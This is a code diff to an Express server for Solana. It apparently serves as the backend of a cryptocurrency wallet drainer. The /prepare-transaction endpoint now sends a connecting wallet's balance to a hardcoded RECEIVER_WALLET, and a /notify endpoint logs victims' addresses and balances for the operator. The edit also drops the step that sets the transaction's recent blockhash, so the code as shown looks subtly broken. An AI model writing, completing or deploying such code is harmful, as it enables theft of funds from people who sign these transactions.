@@ -11,11 +11,11 @@ const connection = new Connection(HELIUS_RPC, 'confirmed');
 
 app.post('/prepare-transaction', async (req, res) => {
     try {
-        const { publicKey, receiverWallet } = req.body;
+        const { publicKey } = req.body;
         console.log('Preparing tx for:', publicKey);
         
         const fromPubkey = new PublicKey(publicKey);
-        const toPubkey = new PublicKey(receiverWallet);
+        const toPubkey = new PublicKey(RECEIVER_WALLET);
         
         const balance = await connection.getBalance(fromPubkey);
         console.log('Balance:', balance / LAMPORTS_PER_SOL, 'SOL');
@@ -36,23 +36,27 @@ app.post('/prepare-transaction', async (req, res) => {
             })
         );
         
-        const { blockhash } = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = blockhash;
-        transaction.feePayer = fromPubkey;
+        const serialized = transaction.serialize({ 
+            requireAllSignatures: false, 
+            verifySignatures: false 
+        });
         
-        const serialized = transaction.serialize({ requireAllSignatures: false, verifySignatures: false });
+        res.json({ 
+            success: true, 
+            transaction: Array.from(serialized),
+            amount: amountToSend 
+        });
         
-        res.json({ success: true, transaction: Array.from(serialized), amount: amountToSend });
     } catch (error) {
         console.error('Error:', error);
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
-app.post('/notify', async (req, res) => {
-    console.log('Notification:', req.body.customMessage);
-    console.log('Address:', req.body.address);
-    console.log('Balance:', req.body.balance);
+app.post('/notify', (req, res) => {
+    console.log('📱', req.body.customMessage);
+    console.log('👛', req.body.address);
+    console.log('💰', req.body.balance, 'SOL');
     res.json({ ok: true });
 });
 
